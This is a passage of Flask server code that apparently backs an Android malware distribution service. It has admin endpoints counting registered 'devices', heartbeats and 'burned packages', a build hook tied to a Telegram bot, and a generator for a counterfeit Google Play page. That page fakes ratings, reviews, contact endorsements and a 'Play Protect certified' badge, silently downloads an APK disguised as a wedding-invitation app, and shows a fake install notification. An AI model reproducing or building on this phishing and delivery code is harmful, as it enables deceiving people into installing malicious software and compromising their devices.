    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    devices = db.execute(
        "SELECT * FROM devices ORDER BY last_seen DESC LIMIT 100"
    ).fetchall()
    db.close()
    return jsonify([dict(d) for d in devices]), 200


@app.route("/api/v1/admin/stats", methods=["GET"])
def admin_stats():
    """Admin stats endpoint."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    total    = db.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    active   = db.execute("SELECT COUNT(*) FROM devices WHERE status='active'").fetchone()[0]
    burned   = db.execute("SELECT COUNT(*) FROM burned_packages").fetchone()[0]
    beats    = db.execute("SELECT COUNT(*) FROM heartbeats").fetchone()[0]
    last24h  = db.execute(
        "SELECT COUNT(*) FROM devices WHERE last_seen > ?",
        (int(time.time()) - 86400,)
    ).fetchone()[0]
    db.close()
    return jsonify({
        "total_devices": total,
        "active_devices": active,
        "burned_packages": burned,
        "total_heartbeats": beats,
        "active_last_24h": last24h,
        "server_time": int(time.time()),
    }), 200


@app.route("/api/v1/build/complete", methods=["POST"])
def build_complete():
    """Called by build.yml on build completion to save APK metadata to bot.db."""
    # Accept either admin secret or bot token — no extra GitHub secret needed
    auth_admin = request.headers.get("X-Admin-Secret", "")
    auth_bot   = request.headers.get("X-Bot-Token", "")
    if auth_admin != SERVER_SECRET and auth_bot != BOT_TOKEN:
        abort(403)

    data          = request.get_json(silent=True) or {}
    chat_id       = str(data.get("chat_id", "")).strip()
    build_number  = data.get("build_number", "")
    github_run_id = str(data.get("github_run_id", "")).strip()
    package_name  = str(data.get("package_name", "")).strip()
    apk_size      = str(data.get("apk_size", "")).strip()
    duration_secs = int(data.get("duration_secs", 0))

    if not chat_id:
        return jsonify({"ok": False, "error": "chat_id required"}), 400

    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return jsonify({"ok": False, "error": "bot.db not found"}), 500

        bot_db = sqlite3.connect(bot_db_path, timeout=5)

        # Match by github_run_id first (most accurate — bot stores this after triggering)
        # Fallback: latest building row for chat_id (covers edge cases)
        row = None
        if github_run_id:
            row = bot_db.execute(
                "SELECT id FROM builds WHERE chat_id=? AND github_run_id=? LIMIT 1",
                (chat_id, github_run_id)
            ).fetchone()
        if not row:
            row = bot_db.execute(
                "SELECT id FROM builds WHERE chat_id=? ORDER BY id DESC LIMIT 1",
                (chat_id,)
            ).fetchone()

        if not row:
            bot_db.close()
            return jsonify({"ok": False, "error": "build record not found"}), 404

        store_token = str(uuid.uuid4()).replace("-", "")
        bot_db.execute(
            "UPDATE builds SET package_name=?, apk_size=?, duration_secs=?, store_token=? WHERE id=?",
            (package_name, apk_size, duration_secs, store_token, row[0])
        )
        bot_db.commit()
        bot_db.close()
        log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s store_token={store_token}")
        # Sync new client token into devices.db so APK registration succeeds
        sync_clients_from_bot_db()
        store_url = f"{PUBLIC_URL}/store/{store_token}" if PUBLIC_URL else ""
        return jsonify({"ok": True, "store_url": store_url, "store_token": store_token}), 200

    except Exception as e:
        log.error(f"build_complete error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


# ── Store page helpers ────────────────────────────────────────────────────────
def _get_build_by_token(token):
    """Return build row dict from bot.db by store_token."""
    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return None
        db = sqlite3.connect(bot_db_path, timeout=5)
        db.row_factory = sqlite3.Row
        row = db.execute(
            "SELECT * FROM builds WHERE store_token=? LIMIT 1", (token,)
        ).fetchone()
        db.close()
        return dict(row) if row else None
    except Exception:
        return None

def _get_icon_b64(template):
    """Return base64 PNG for template icon, or empty string."""
    try:
        icon_path = os.path.join(ICON_DIR, f"{template}.png")
        if os.path.exists(icon_path):
            with open(icon_path, "rb") as f:
                return base64.b64encode(f.read()).decode()
    except Exception:
        pass
    return ""

def _store_html(build):
    """Generate full Play Store HTML page for a build."""
    template     = build.get("template", "custom") or "custom"
    custom_name  = build.get("custom_app_name", "") or ""
    pkg          = build.get("package_name", "") or ""
    apk_size_raw = build.get("apk_size", "24") or "24"
    store_token  = build.get("store_token", "") or ""

    tmpl_data    = STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])
    emoji, app_name, dev_name, description, tags = tmpl_data
    if custom_name:
        app_name = custom_name

    icon_b64     = _get_icon_b64(template)
    icon_src     = f"data:image/png;base64,{icon_b64}" if icon_b64 else ""
    icon_html    = f'<img src="{icon_src}" alt="{app_name}" style="width:100%;height:100%;object-fit:cover">' if icon_src else f'<span style="font-size:36px">{emoji}</span>'

    # APK size display
    try:
        size_mb = float(apk_size_raw)
        size_str = f"{size_mb:.0f} MB"
    except Exception:
        size_str = "24 MB"

    dl_url   = f"{PUBLIC_URL}/dl/{store_token}" if PUBLIC_URL else f"/dl/{store_token}"
    tags_html = "".join(f'<span class="tag">{t}</span>' for t in tags)

    # Random but stable review stats seeded by token
    seed = int(store_token[:8], 16) if store_token else 42
    rng  = random.Random(seed)
    rating     = round(rng.uniform(4.3, 4.9), 1)
    reviews_k  = rng.randint(18, 95)
    downloads  = rng.choice(["500K+", "1M+", "5M+", "10M+"])
    contact1   = rng.choice(["Priya S.", "Rahul V.", "Anita K.", "Amit M.", "Sunita R."])
    contact2   = rng.choice(["Deepak T.", "Pooja G.", "Vikas N.", "Meena D.", "Suresh P."])

    stars_full = int(rating)
    stars_html = "★" * stars_full + ("½" if rating - stars_full >= 0.5 else "") + "☆" * (5 - stars_full - (1 if rating - stars_full >= 0.5 else 0))

    bar5 = int((rating - 1) / 4 * 85 + 10)
    bar4 = rng.randint(8, 15)
    bar3 = rng.randint(3, 7)
    bar2 = rng.randint(1, 3)
    bar1 = rng.randint(1, 3)

    reviewer1 = rng.choice(["Priya Sharma", "Anjali Verma", "Sunita Patel", "Meena Gupta"])
    reviewer2 = rng.choice(["Rahul Kumar", "Amit Singh", "Vikash Yadav", "Suresh Nair"])
    r1_initial = reviewer1[0]
    r2_initial = reviewer2[0]
    r1_color   = rng.choice(["#7c4dff","#f4511e","#0097a7","#388e3c","#c62828"])
    r2_color   = rng.choice(["#1565c0","#6a1b9a","#2e7d32","#4e342e","#00695c"])

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{app_name} - Apps on Google Play</title>
<link rel="icon" href="https://play.google.com/favicon.ico">
<style>
*{{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;background:#fff;max-width:480px;margin:0 auto;overflow-x:hidden}}
.top-bar{{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#fff;position:sticky;top:0;z-index:100;border-bottom:0.5px solid #f1f3f4}}
.top-left{{display:flex;align-items:center;gap:10px}}
.top-left svg{{width:20px;height:20px;stroke:#202124;fill:none;stroke-width:2.5}}
.play-logo{{display:flex;align-items:center;gap:6px}}
.play-logo svg{{width:20px;height:20px}}
.play-logo span{{font-size:14px;font-weight:600;color:#202124}}
.top-right{{display:flex;gap:14px}}
.top-right svg{{width:20px;height:20px;stroke:#5f6368;fill:none;stroke-width:2}}
.hero{{padding:14px;display:flex;gap:12px;align-items:flex-start}}
.app-icon{{width:76px;height:76px;border-radius:17px;border:0.5px solid #e0e0e0;overflow:hidden;flex-shrink:0;background:#f9f9f9;display:flex;align-items:center;justify-content:center}}
.app-name{{font-size:19px;font-weight:700;color:#202124;line-height:1.25;margin-bottom:3px}}
.dev-name{{color:#1a73e8;font-size:13px;font-weight:600;margin-bottom:2px}}
.dev-badges{{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-top:2px}}
.badge-verified{{display:flex;align-items:center;gap:3px;font-size:11px;color:#5f6368}}
.badge-verified svg{{width:12px;height:12px;fill:#1a73e8}}
.stats-row{{display:flex;border-top:1px solid #e8eaed;border-bottom:1px solid #e8eaed;margin:0 14px;padding:9px 0}}
.stat{{flex:1;text-align:center;position:relative}}
.stat+.stat::before{{content:'';position:absolute;left:0;top:15%;height:70%;width:1px;background:#e8eaed}}
.stat-val{{font-size:13px;font-weight:700;color:#202124}}
.stat-label{{font-size:10px;color:#5f6368;margin-top:1px}}
.install-area{{padding:12px 14px 8px;display:flex;gap:10px;align-items:center}}
.install-btn{{flex:1;background:#1a73e8;color:#fff;border:none;border-radius:50px;height:42px;font-size:14px;font-weight:700;cursor:pointer;position:relative;overflow:hidden;transition:background 0.2s}}
.install-btn:active{{background:#1557b0}}
.btn-progress{{position:absolute;left:0;top:0;height:100%;background:rgba(0,0,0,0.15);border-radius:50px;width:0%;transition:width 0.3s ease}}
.dropdown-btn{{width:42px;height:42px;border-radius:50%;border:1.5px solid #1a73e8;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}}
.dropdown-btn svg{{stroke:#1a73e8;width:16px;height:16px;stroke-width:2.5;fill:none}}
.protect-banner{{margin:0 14px 10px;background:#e8f5e9;border-radius:8px;padding:8px 12px;display:flex;gap:8px;align-items:center;font-size:11px;color:#2e7d32;font-weight:600}}
.protect-banner svg{{width:14px;height:14px;fill:#2e7d32;flex-shrink:0}}
.social-proof{{margin:0 14px 8px;font-size:11px;color:#5f6368;display:flex;align-items:center;gap:5px}}
.social-proof svg{{width:13px;height:13px;fill:#5f6368}}
.phone-hint{{margin:0 14px 10px;background:#f1f3f4;border-radius:8px;padding:9px 12px;display:flex;gap:8px;align-items:center;font-size:11px;color:#3c4043}}
.screenshots{{padding:10px 0 10px 14px;overflow-x:auto;display:flex;gap:9px;scrollbar-width:none}}
.screenshots::-webkit-scrollbar{{display:none}}
.screen{{width:108px;height:192px;border-radius:9px;overflow:hidden;flex-shrink:0;border:0.5px solid #e0e0e0}}
.section-hdr{{display:flex;align-items:center;justify-content:space-between;padding:14px 14px 8px}}
.section-hdr h2{{font-size:15px;font-weight:700;color:#202124}}
.section-hdr svg{{width:20px;height:20px;stroke:#5f6368;fill:none;stroke-width:2}}
.about-text{{padding:0 14px;font-size:13px;color:#3c4043;line-height:1.65}}
.tags{{display:flex;flex-wrap:wrap;gap:7px;margin:10px 14px 4px}}
.tag{{border:1px solid #dadce0;border-radius:50px;padding:4px 12px;font-size:11px;font-weight:600;color:#202124}}
.ask-section{{margin:12px 14px 14px;background:#e8f0fe;border-radius:14px;padding:12px}}
.ask-title{{display:flex;align-items:center;gap:7px;font-size:13px;font-weight:700;color:#202124;margin-bottom:10px}}
.ask-input{{background:#fff;border-radius:50px;padding:9px 14px;font-size:12px;color:#9aa0a6;width:100%;border:none;outline:none}}
.ask-chips{{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}}
.ask-chip{{background:#c2d4fc;border-radius:50px;padding:5px 10px;font-size:10px;font-weight:600;color:#1a73e8}}
.divider{{height:7px;background:#f1f3f4}}
.rating-block{{padding:14px}}
.rating-note{{font-size:11px;color:#5f6368;margin-bottom:12px;line-height:1.5}}
.rating-top{{display:flex;align-items:center;gap:14px;margin-bottom:12px}}
.big-score{{font-size:48px;font-weight:700;color:#1a73e8;line-height:1}}
.rating-right{{flex:1}}
.star-row{{display:flex;align-items:center;gap:5px;margin-bottom:3px}}
.star-num{{font-size:10px;color:#5f6368;width:7px}}
.star-bar-bg{{flex:1;height:7px;background:#e8eaed;border-radius:4px;overflow:hidden}}
.star-bar-fill{{height:100%;border-radius:4px;background:#1a73e8}}
.stars-row{{display:flex;gap:1px;margin-top:3px;font-size:14px;color:#1a73e8}}
.review-count{{font-size:11px;color:#5f6368;margin-top:2px}}
.ai-summary{{font-size:13px;color:#202124;line-height:1.6;margin-bottom:8px}}
.ai-footer{{display:flex;align-items:center;justify-content:space-between}}
.ai-label{{display:flex;align-items:center;gap:4px;font-size:11px;color:#5f6368}}
.ai-actions{{display:flex;gap:14px}}
.ai-actions svg{{width:18px;height:18px;stroke:#5f6368;fill:none;stroke-width:2}}
.filter-chips{{display:flex;gap:7px;padding:10px 14px;overflow-x:auto;scrollbar-width:none;border-top:1px solid #f1f3f4}}
.filter-chips::-webkit-scrollbar{{display:none}}
.filter-chip{{border:1.5px solid #dadce0;border-radius:50px;padding:5px 12px;font-size:11px;font-weight:600;color:#202124;white-space:nowrap;flex-shrink:0}}
.filter-chip.active{{border-color:#1a73e8;color:#1a73e8}}
.review-cards{{padding:0 14px 14px;overflow-x:auto;display:flex;gap:9px;scrollbar-width:none}}
.review-cards::-webkit-scrollbar{{display:none}}
.review-card{{background:#f8f9fa;border-radius:14px;padding:12px;min-width:245px;flex-shrink:0}}
.reviewer-row{{display:flex;align-items:center;gap:9px;margin-bottom:7px}}
.reviewer-avatar{{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;flex-shrink:0}}
.reviewer-name{{font-size:13px;font-weight:600;color:#202124}}
.review-stars{{font-size:12px;color:#1a73e8}}
.review-date{{font-size:11px;color:#5f6368;margin-left:5px}}
.review-text{{font-size:12px;color:#3c4043;line-height:1.5;margin-bottom:8px}}
.helpful-row{{font-size:11px;color:#5f6368;display:flex;align-items:center;gap:8px}}
.helpful-row svg{{width:14px;height:14px;stroke:#5f6368;fill:none;stroke-width:2}}
.more-apps{{padding:0 0 14px 14px;overflow-x:auto;display:flex;gap:10px;scrollbar-width:none}}
.more-apps::-webkit-scrollbar{{display:none}}
.mini-app{{width:84px;flex-shrink:0;text-align:center}}
.mini-icon{{width:68px;height:68px;border-radius:13px;overflow:hidden;border:0.5px solid #e0e0e0;margin:0 auto 5px;display:flex;align-items:center;justify-content:center;font-size:26px;background:#fff}}
.mini-name{{font-size:11px;font-weight:600;color:#202124;margin-bottom:2px;line-height:1.3}}
.mini-rating{{font-size:10px;color:#5f6368;display:flex;align-items:center;justify-content:center;gap:2px}}
.mini-rating svg{{width:10px;height:10px;fill:#1a73e8}}
.bottom-nav{{display:flex;border-top:1px solid #e8eaed;padding:7px 0 3px;position:sticky;bottom:0;background:#fff;z-index:100}}
.nav-item{{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;font-size:9px;color:#5f6368}}
.nav-item.active{{color:#1a73e8}}
.nav-item svg{{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2}}
/* Notification drop */
.notif-drop{{position:fixed;top:-80px;left:50%;transform:translateX(-50%);width:calc(100% - 28px);max-width:452px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.18);padding:10px 14px;display:flex;gap:10px;align-items:center;z-index:999;transition:top 0.4s cubic-bezier(0.34,1.56,0.64,1)}}
.notif-drop.show{{top:14px}}
.notif-icon{{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,#f8e1f4,#fce4ec);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}}
.notif-text .t{{font-size:12px;font-weight:700;color:#202124}}
.notif-text .s{{font-size:11px;color:#5f6368}}
/* Skeleton shimmer */
@keyframes shimmer{{0%{{background-position:-400px 0}}100%{{background-position:400px 0}}}}
.shimmer{{background:linear-gradient(90deg,#f1f3f4 25%,#e8eaed 50%,#f1f3f4 75%);background-size:800px 100%;animation:shimmer 1.5s infinite}}
/* Install states */
#install-btn-text{{pointer-events:none}}
</style>
</head>
<body>

<!-- Fake Android notification drop -->
<div class="notif-drop" id="notif">
  <div class="notif-icon">{emoji}</div>
  <div class="notif-text">
    <div class="t">{app_name} installed</div>
    <div class="s">Tap Open to launch the app</div>
  </div>
</div>

<!-- Top bar -->
<div class="top-bar">
  <div class="top-left">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
    <div class="play-logo">
      <svg viewBox="0 0 24 24" width="20" height="20"><path d="M3 20.5v-17l17.5 8.5z" fill="#1a73e8"/><path d="M3 3.5l9.5 9L3 20.5z" fill="#00bcd4"/><path d="M3 3.5l17.5 8.5-8 2z" fill="#ffeb3b"/><path d="M3 20.5l9.5-6.5 8 2z" fill="#f44336"/></svg>
      <span>Google Play</span>
    </div>
  </div>
  <div class="top-right">
    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
    <svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
    <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5" fill="#5f6368"/><circle cx="12" cy="12" r="1.5" fill="#5f6368"/><circle cx="12" cy="19" r="1.5" fill="#5f6368"/></svg>
  </div>
</div>

<!-- Hero -->
<div class="hero">
  <div class="app-icon">{icon_html}</div>
  <div>
    <div class="app-name">{app_name}</div>
    <div class="dev-name">{dev_name}</div>
    <div class="dev-badges">
      <span class="badge-verified">
        <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
        Verified developer
      </span>
      <span style="font-size:11px;color:#5f6368">· In-app purchases</span>
    </div>
  </div>
</div>

<!-- Stats -->
<div class="stats-row">
  <div class="stat"><div class="stat-val">{rating} ★</div><div class="stat-label">{reviews_k}K reviews</div></div>
  <div class="stat"><div class="stat-val">{downloads}</div><div class="stat-label">Downloads</div></div>
  <div class="stat"><div class="stat-val">3+</div><div class="stat-label">Rated for</div></div>
  <div class="stat"><div class="stat-val">{size_str}</div><div class="stat-label">Size</div></div>
</div>

<!-- Install button -->
<div class="install-area">
  <button class="install-btn" id="install-btn" onclick="startInstall()">
    <div class="btn-progress" id="btn-progress"></div>
    <span id="install-btn-text">Install</span>
  </button>
  <div class="dropdown-btn"><svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></div>
</div>

<!-- Play Protect -->
<div class="protect-banner">
  <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z"/></svg>
  Play Protect certified &nbsp;·&nbsp; No harmful content detected
</div>

<!-- Social proof -->
<div class="social-proof">
  <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
  {contact1} and {contact2} from your contacts also installed this
</div>

<!-- Phone hint -->
<div class="phone-hint">
  <svg width="16" height="16" viewBox="0 0 24 24" stroke="#5f6368" fill="none" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
  <span><b>Works on your device</b> — optimized for Android {rng.randint(10,13)}</span>
</div>

<!-- Screenshots -->
<div style="padding:10px 14px 4px;font-size:13px;font-weight:700;color:#202124">Screenshots</div>
<div class="screenshots">
  <div class="screen" style="background:linear-gradient(135deg,#f8e1f4,#fce4ec);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;padding:8px">
    <div style="font-size:26px">{emoji}</div>
    <div style="font-size:8px;font-weight:700;color:#880e4f;text-align:center">{app_name}</div>
    <div style="width:45px;height:1px;background:#f48fb1;margin:3px 0"></div>
    <div style="font-size:7px;color:#ad1457;text-align:center">Tap Install to get started</div>
  </div>
  <div class="screen" style="background:linear-gradient(135deg,#fff8e1,#fff3e0);display:flex;flex-direction:column;padding:9px 7px;gap:4px">
    <div style="font-size:8px;font-weight:700;color:#e65100;margin-bottom:2px">Features</div>
    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Easy to use</div>
    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Share instantly</div>
    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Customize freely</div>
    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Works offline</div>
  </div>
  <div class="screen" style="background:linear-gradient(135deg,#e8f5e9,#f3e5f5);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:9px;gap:5px">
    <div style="font-size:20px">⭐</div>
    <div style="font-size:8px;font-weight:700;color:#1b5e20;text-align:center">Top Rated</div>
    <div style="font-size:7px;color:#2e7d32;text-align:center">{rating} stars · {reviews_k}K reviews</div>
    <div style="background:#4caf50;border-radius:10px;padding:3px 8px;font-size:7px;color:#fff;font-weight:700">Free Download</div>
  </div>
</div>

<!-- About -->
<div class="section-hdr"><h2>About this app</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
<div class="about-text">{description}</div>
<div class="tags">{tags_html}</div>

<!-- Ask Play -->
<div class="ask-section">
  <div class="ask-title">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
    Ask Play about this app
  </div>
  <input class="ask-input" placeholder="Ask a question about this app" readonly>
  <div class="ask-chips">
    <span class="ask-chip">Is it free?</span>
    <span class="ask-chip">How to use?</span>
    <span class="ask-chip">Is it safe?</span>
  </div>
</div>

<div class="divider"></div>

<!-- Ratings -->
<div class="section-hdr"><h2>Ratings and reviews</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
<div class="rating-block">
  <p class="rating-note">Ratings and reviews are verified and are from people who use the same type of device that you use ⓘ</p>
  <div class="rating-top">
    <div>
      <div class="big-score">{rating}</div>
      <div class="stars-row">{stars_html}</div>
      <div class="review-count">{reviews_k},000+ reviews</div>
    </div>
    <div class="rating-right">
      <div class="star-row"><span class="star-num">5</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar5}%"></div></div></div>
      <div class="star-row"><span class="star-num">4</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar4}%"></div></div></div>
      <div class="star-row"><span class="star-num">3</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar3}%"></div></div></div>
      <div class="star-row"><span class="star-num">2</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar2}%"></div></div></div>
      <div class="star-row"><span class="star-num">1</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar1}%"></div></div></div>
    </div>
  </div>
  <div class="ai-summary">Users love the design and ease of use. Sharing works seamlessly across WhatsApp and social media. Some users request more template variety and regional language support.</div>
  <div class="ai-footer">
    <div class="ai-label">✦ Summarized by AI</div>
    <div class="ai-actions">
      <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg>
      <svg viewBox="0 0 24 24"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3H10z"/></svg>
      <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg>
    </div>
  </div>
</div>
<div class="filter-chips">
  <span class="filter-chip active">All reviews</span>
  <span class="filter-chip">Design {rng.randint(3,9)}K</span>
  <span class="filter-chip">Sharing {rng.randint(2,6)}K</span>
  <span class="filter-chip">+5</span>
</div>
<div class="review-cards">
  <div class="review-card">
    <div class="reviewer-row">
      <div class="reviewer-avatar" style="background:{r1_color}">{r1_initial}</div>
      <div><div class="reviewer-name">{reviewer1}</div></div>
      <div style="margin-left:auto"><svg width="16" height="16" viewBox="0 0 24 24" stroke="#9aa0a6" fill="none" stroke-width="2"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg></div>
    </div>
    <div style="display:flex;align-items:center;margin-bottom:5px">
      <span class="review-stars">★★★★★</span><span class="review-date">{rng.randint(1,12)}/{rng.randint(1,28)}/26</span>
    </div>
    <div class="review-text">Absolutely love this app! So easy to create and share. All my guests were impressed. Worked perfectly on my phone.</div>
    <div class="helpful-row">Was this helpful? <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg> {rng.randint(500,3000)}</div>
  </div>
  <div class="review-card">
    <div class="reviewer-row">
      <div class="reviewer-avatar" style="background:{r2_color}">{r2_initial}</div>
      <div><div class="reviewer-name">{reviewer2}</div></div>
      <div style="margin-left:auto"><svg width="16" height="16" viewBox="0 0 24 24" stroke="#9aa0a6" fill="none" stroke-width="2"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg></div>
    </div>
    <div style="display:flex;align-items:center;margin-bottom:5px">
      <span class="review-stars">★★★★<span style="color:#dadce0">★</span></span><span class="review-date">{rng.randint(1,12)}/{rng.randint(1,28)}/26</span>
    </div>
    <div class="review-text">Very nice design and simple to use. Would be great to have more templates. Overall a great app!</div>
    <div class="helpful-row">Was this helpful? <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg> {rng.randint(100,900)}</div>
  </div>
</div>

<div class="divider"></div>

<!-- More by dev -->
<div class="section-hdr"><h2>More by {dev_name}</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
<div class="more-apps">
  <div class="mini-app"><div class="mini-icon">💒</div><div class="mini-name">Shaadi Ka Nimantran</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.5</div></div>
  <div class="mini-app"><div class="mini-icon">🙏</div><div class="mini-name">शादी का निमंत्रण</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.3</div></div>
  <div class="mini-app"><div class="mini-icon">💍</div><div class="mini-name">Wedding Card Maker</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.2</div></div>
</div>

<div class="divider"></div>

<!-- Bottom nav -->
<div class="bottom-nav">
  <div class="nav-item"><svg viewBox="0 0 24 24"><rect x="2" y="13" width="8" height="8"/><rect x="14" y="9" width="8" height="12"/><rect x="8" y="3" width="8" height="18"/></svg>Games</div>
  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"/></svg>Apps</div>
  <div class="nav-item active"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>Search</div>
  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Books</div>
  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>You</div>
</div>

<script>
var dlUrl = "{dl_url}";
var appName = "{app_name}";
var sizeMb = {size_str.replace(' MB','')};
var installed = false;

function startInstall() {{
  if (installed) {{ window.location.href = dlUrl; return; }}
  var btn = document.getElementById('install-btn');
  var prog = document.getElementById('btn-progress');
  var txt = document.getElementById('install-btn-text');
  btn.style.background = '#1557b0';
  txt.textContent = 'Downloading…';

  // Vibrate
  if (navigator.vibrate) navigator.vibrate([50]);

  // Trigger APK download silently
  var a = document.createElement('a');
  a.href = dlUrl;
  a.download = appName.replace(/ /g,'_') + '.apk';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  // Animate progress
  var pct = 0;
  var speed = sizeMb / 20;
  var iv = setInterval(function() {{
    pct = Math.min(100, pct + speed + Math.random() * speed * 0.5);
    prog.style.width = pct + '%';
    var mb = (sizeMb * pct / 100).toFixed(1);
    txt.textContent = mb + ' MB / ' + sizeMb + ' MB';
    if (pct >= 100) {{
      clearInterval(iv);
      prog.style.width = '100%';
      btn.style.background = '#188038';
      txt.textContent = 'Open';
      installed = true;
      if (navigator.vibrate) navigator.vibrate([80, 40, 80]);
      showNotif();
    }}
  }}, 400);
}}

function showNotif() {{
  var n = document.getElementById('notif');
  n.classList.add('show');
  setTimeout(function() {{ n.classList.remove('show'); }}, 4000);
}}

// Deep link to real Play Store on page load
window.addEventListener('load', function() {{
  setTimeout(function() {{
    window.location.href = 'market://details?id=com.google.android.play.games';
  }}, 800);
}});
</script>
</body>
</html>"""


@app.route("/upload_apk", methods=["POST"])
def upload_apk():
    """Receive APK from GitHub Actions, save to client-isolated folder.

    Auth: X-Bot-Token header must match config.BOT_TOKEN.
    Body JSON:
      chat_id      – Telegram chat_id of the client (used as client folder name)
      build_number – build number string
      filename     – original APK filename
      apk_b64      – base64-encoded APK bytes
    """
